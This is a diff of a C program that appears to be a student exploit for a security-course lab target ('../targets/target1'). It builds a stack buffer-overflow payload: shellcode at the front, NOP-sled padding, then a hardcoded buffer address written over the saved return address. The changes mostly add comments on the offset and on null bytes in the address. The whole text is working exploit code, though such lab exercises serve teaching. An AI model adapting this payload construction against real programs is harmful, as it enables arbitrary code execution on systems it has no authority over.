@@ -6,8 +6,8 @@
 
 #define TARGET "../targets/target1"
 
-#define BUFFER_SIZE 353
-#define BUFFER_ADDR 0x0000000040a4fd70
+#define BUFFER_SIZE 353 // saved rip - &buf
+#define BUFFER_ADDR 0x0000000040a4fd70 // &buf
 
 int
 main ( int argc, char * argv[] )
@@ -18,24 +18,19 @@ main ( int argc, char * argv[] )
     // Create the attack buffer
     char attack_buffer[BUFFER_SIZE + 1];
 
-    // Fill in with the return address
-    
-    // for (int i = 0; i < 288; i += 8) {
-    //     *(addr_ptr++) = BUFFER_ADDR;
-    // }
-
     // Place the shell code at the front
     int i;
     for (i = 0; i < strlen(shellcode); ++i) {
         attack_buffer[i] = shellcode[i];
     }
 
-    // Fill in with NOP
+    // Fill in with NOPs
+    // Note that we cannot pad with BUFFER_ADDR because there are nulls in the BUFFER_ADDR
     for (; i < BUFFER_SIZE - 9; ++i) {
         attack_buffer[i] = 0x90;
     }
 
-    // Overwrite the return address
+    // Overwrite the return address. 
     long *addr_ptr = (long *)(attack_buffer+i);
     *addr_ptr = BUFFER_ADDR;
 
